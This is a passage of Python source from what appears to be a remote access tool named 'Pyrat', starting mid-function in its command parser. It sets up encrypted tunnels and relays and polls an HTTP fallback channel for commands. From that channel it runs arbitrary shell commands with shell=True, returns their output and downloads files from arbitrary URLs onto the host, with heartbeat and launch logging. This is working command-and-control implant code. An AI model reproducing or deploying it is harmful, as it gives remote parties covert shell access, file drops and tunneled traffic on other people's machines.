            elif parts[1] == TunnelMode.INVERTED_SERVER:
                enc_mode = 2

            local_socket_mode = 0 if parts[2] == TunnelMode.SERVER else 1
            remote_socket_mode = 0 if parts[3] == TunnelMode.SERVER else 1

            if int(parts[4]) == -1:
                key_index = random.randint(0, len(enc_keys)-1)
            else:
                key_index = int(parts[4])

            local_address = parts[5]
            local_port = int(parts[6])
            local_enc_address = parts[7]
            local_enc_port = int(parts[8])

            remote_address = parts[9]
            remote_port = int(parts[10])
            remote_enc_address = parts[11]
            remote_enc_port = int(parts[12])

            def create_remote_tunnel():
                if enc_mode == 0:
                    remote_enc_mode = 1
                elif enc_mode == 2:
                    remote_enc_mode = 2
                else:
                    remote_enc_mode = 0

                print("Creating remote tunnel", remote_enc_mode, remote_socket_mode)
                return _selected_socket.openTunnel(remote_enc_mode, remote_socket_mode, key_index, remote_address, remote_port, remote_enc_address, remote_enc_port)
                
            def create_local_tunnel():
                print("Creating local tunnel", enc_mode, local_socket_mode)
                local_enc_mode = enc_mode
                if enc_mode == 2:
                    local_enc_mode = 1

                print(local_address + ":" + str(local_port))
                print(local_enc_address + ":" + str(local_enc_port))

                tunnel = Tunnel(enc_keys, local_enc_mode, local_socket_mode)
                tunnel.connect(key_index, local_address, local_port, local_enc_address, local_enc_port)
                _tunnels.append(tunnel)
                return tunnel

            # create remote server part of the tunnel first regardless if remote or local
            if enc_mode == 1:
                print("Client Mode")
                if create_remote_tunnel():
                    create_local_tunnel()
            else:
                print("Server Mode")
                tun =  create_local_tunnel()
                if not create_remote_tunnel():
                    _tunnels.remove(tun)

        elif parts[0] == "tunnel.list":
            for tunnel in _tunnels:
                print(tunnel.status())

        elif parts[0] == "tunnel.close":
            index = int(parts[1])
            if index >= len(_tunnels):
                print("Invalid index")
                return

            res = _selected_socket.closeTunnel(index)
            if res:
                _tunnels[index].close()
                _tunnels.pop(index)
                print("Closed tunnel")
            else:
                print("Failed to close tunnel")

        elif parts[0] == "relay.start":
            host1 = parts[1]
            port1 = int(parts[2])
            host2 = parts[3]
            port2 = int(parts[4])

            res = _selected_socket.startRelay(host1, port1, host2, port2)

            if res:
                print("Started relay")
            else:
                print("Failed to start relay")

        elif parts[0] == "relay.list":
            relays = _selected_socket.listRelays()
            for relay in relays:
                print(relay.address1 +":"+ str(relay.port1) +" -> "+ relay.address2 +":"+ str(relay.port2) + " ("+ str(relay.connected1) +","+ str(relay.connected2) +","+ str(relay.is_running) +")")

        elif parts[0] == "relay.stop":
            res = _selected_socket.stopRelay(int(parts[1]))
            if res:
                print("Stopped relay")
            else:
                print("Failed to stop relay")

        elif parts[0] == "repo.info":
            commit_hash, commit_date = _selected_socket.gitRepoInfo()
            if commit_hash is not None and commit_date is not None:
                print(commit_hash)
                print(commit_date)

        elif parts[0] == "macro.set":
            name = parts[1]
            value = parts[2]
            macros.set(name, value)

        elif parts[0] == 'macro.delete':
            name = parts[1]
            macros.delete(name)

        elif parts[0] == 'remote.upgrade':
            _selected_socket.upgradeRemoteSide()

        elif parts[0] == 'exec':
            cmd = ' '.join(parts[1:])

            try:
                # Run the command locally
                result = subprocess.check_output(cmd, shell=True, universal_newlines=True)
                print(result)
            except subprocess.CalledProcessError as e:
                print(f"Command execution failed: {e}")

        elif parts[0] == 'get':
            res = _selected_socket.getPendingReply()
            if res:
                print(res)

        elif parts[0] == 'set':
            if parts[1] == 'timeout':
                _reply_timeout = int(parts[2])

        else:
            cmd = macros.get(parts[0])
            if cmd:
                print("Executing macro: "+ cmd)
                self.commands.append(cmd)
            else:
                # default to running a command
                cmd = ''
                for part in parts:
                    cmd += part + ' '

                result = _selected_socket.cmd(cmd.strip(), 10000)
                print(result)

    def run(self):
        global _controlc_count, _run, _connection_monitor_threads, _socket_threads, _tunnels, _selected_socket, macros, _reply_timeout

        while _run:
            try:
                if len(self.commands) > 0:
                    print("Executing: "+ self.commands[0])
                    line = self.commands.popleft()
                else:
                    line = input("#: ")
                    _controlc_count = 0

                self.parse(line)

            except Exception as e:
                print(str(e))
                traceback.print_exc()
                
def log(msg):
    for l in _web_log:
        l.log(msg)

def webCommandParserCallback(enc_keys, command):
    if command["cmd"] == 'closeall':
        for thread in _socket_threads:
            thread.close()
        _socket_threads.clear()

        log("Closed all connections")

    elif command["cmd"] == 'connect':
        con_thread = ConnectionMonitorThread(_tunnel_mode, command["socket_mode"], command["host"], int(command["port"]), enc_keys)
        con_thread.start()
        _connection_monitor_threads.append(con_thread)

        log("Appended connection to list")

    elif command["cmd"] == 'cli':
        def run_command_with_timeout(command, timeout):
            log("Executing: "+ command + " with timeout: "+ str(timeout))
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try:
                output, error = process.communicate(timeout=timeout)
                return process.pid, output
            except subprocess.TimeoutExpired:
                return process.pid, None

        pid, output = run_command_with_timeout(command['command'], int(command['timeout']))
        if output:
            set_channel(enc_keys, command["output"], -1, "{}: {}".format(pid, output.decode()))

    elif command['cmd'] == 'download':
        url = command['url']
        output_path = command['path']
        if url.startswith('http://') or url.startswith('https://'):
            log(f"Downloading file from {url}")
            def download_file(url, output_path):
                response = requests.get(url, stream=True)
                total_size = int(response.headers.get('content-length', 0))
                p = total_size / 100
                downloaded = 0
                next_update = 5

                with open(output_path, 'wb') as file:
                    for data in response.iter_content(4096):
                        downloaded += len(data)

                        # Calculate the percentage
                        percentage = downloaded / p
                        if percentage >= next_update:
                            next_update += 5
                            log(f"Downloaded: {percentage:.2f}%")

                        file.write(data)

                log(f"File downloaded successfully from {url}")

            download_file(url, output_path)

# Define a signal handler for SIGINT (Control+C)
def signal_handler(sig, frame):
    global _controlc_count

    _controlc_count = _controlc_count + 1

    if _controlc_count >= 2:
        print("Control+C captured. Exiting...")
        raise KeyboardInterrupt

def main():
    global _run, _tunnel_mode, connections, _relays, enc_keys, _selected_socket, _heart_beat_thread, _console_thread

    # Register the signal handler for SIGINT
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='EncryptedSocket Client')
    parser.add_argument('config', type=str, help='Config file')
    args = parser.parse_args()

    _tunnel_mode, connections, relays, http_fallbacks, enc_keys = load_config(args.config)

    for relay in relays:
        host1, port1, host2, port2 = relay
        print("Starting relay: "+ host1 +":"+ str(port1) +" -> "+ host2 +":"+ str(port2))
        relay = PacketRelay(host1, port1, host2, port2)
        relay.start()
        _relays.append(relay)

    for connection in connections:
        host, port, socket_mode, on_connect = connection

        con_thread = ConnectionMonitorThread(_tunnel_mode, socket_mode, host, port, enc_keys, on_connect)
        con_thread.start()
        _connection_monitor_threads.append(con_thread)

    for http_fallback in http_fallbacks:
        url = http_fallback[0]
        channel = http_fallback[1]
        status_channel = http_fallback[2]
        print(f"Initialising http fallback monitor: {url} : {channel}")
        wl = WebLogQueue(url, status_channel, enc_keys)
        wcp = WebCommandParser(url, channel, enc_keys, wl)
        wcp.start()
        wcp.set_callback(webCommandParserCallback)
        _http_fallbacks.append(wcp)
        _web_log.append(wl)

    if _tunnel_mode == 'local':
        _console_thread = ConsoleThread()

        while len(_socket_threads) == 0:
            time.sleep(1)

        if len(_socket_threads) > 0:
            _selected_socket = _socket_threads[0]

        _console_thread.start()
        _console_thread.join()
    else:
        _heart_beat_channel = get_heart_beat_channel()
        if _heart_beat_channel is not None:
            hb_parts = _heart_beat_channel.split("#")
            _heart_beat_thread = HeartBeatThread(hb_parts[0], hb_parts[1], enc_keys)
            _heart_beat_thread.start()

        current_datetime = datetime.datetime.now()
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        log("Pyrat launched: " + formatted_datetime)

        con_thread.join()

if __name__ == '__main__':
    main()



